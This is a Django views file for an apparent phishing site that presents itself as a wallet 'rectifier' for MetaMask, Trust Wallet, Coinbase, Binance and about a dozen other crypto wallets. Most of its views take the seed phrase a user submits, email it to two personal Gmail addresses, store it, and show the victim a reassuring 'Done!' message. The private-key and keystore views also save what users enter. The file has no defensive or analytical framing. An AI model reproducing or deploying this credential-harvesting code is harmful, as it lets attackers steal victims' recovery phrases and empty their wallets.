from django.shortcuts import render, redirect, get_object_or_404
from main.models import Phrase
from main.forms import PhraseForm, KeyStoreForm, PrivateKeyForm
from django.contrib import messages
import random
import string
from django.core.mail import send_mail

# Create your views here.

def home(requests):
    return render(requests, 'home.html')


def final(requests):
    return render(requests, 'final.html')

error = "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word."
success = 'Done!. Take a screenshot/ download the barcode and send.'

def metamask(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'metamask'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com' ])
                wallet.save()
            else:
                messages.error(request, error)
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def trust_wallet(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'trust wallet'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                wallet.save()
            else:
                messages.error(request,
                               )
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def coinbase(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'coinbase'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                print(wallet.phrase.count(' '))
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def one_inch(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = '1inch'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def aave(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'aave'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def algorand(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'algorand'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def binance(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'binance'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request,
                                 'Done!. Take a screenshot of the barcode and send. Please make sure you are secure.')
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def defiat(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'defiat'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def fantom(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'fantom'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def mew(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'mew'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def solareum(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'solareum'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def solflare(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'solflare'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def tron(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            wallet = form.save(commit=False)
            wallet.wallet = 'tron'
            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                messages.success(request, success)
                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com'])
                wallet.save()
            else:
                messages.error(request,
                               "The seed phrase can only have 12 or 24 words. Make sure each word is separated by a single space and there's no space after the last word.")
    else:
        form = PhraseForm()
    return render(request, 'phrase.html', {'form': form})


def wallet(request):
    return render(request, 'wallet.html')


def private_key(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            new = form.save(commit=False)
            new.transaction_id = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))
            new.save()
    return render(request, 'phrase.html')


def keystore(request):
    if request.method == 'POST':
        form = PhraseForm(request.POST)
        if form.is_valid():
            new = form.save(commit=False)
            new.transaction_id = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))
            new.save()
    return render(request, 'phrase.html')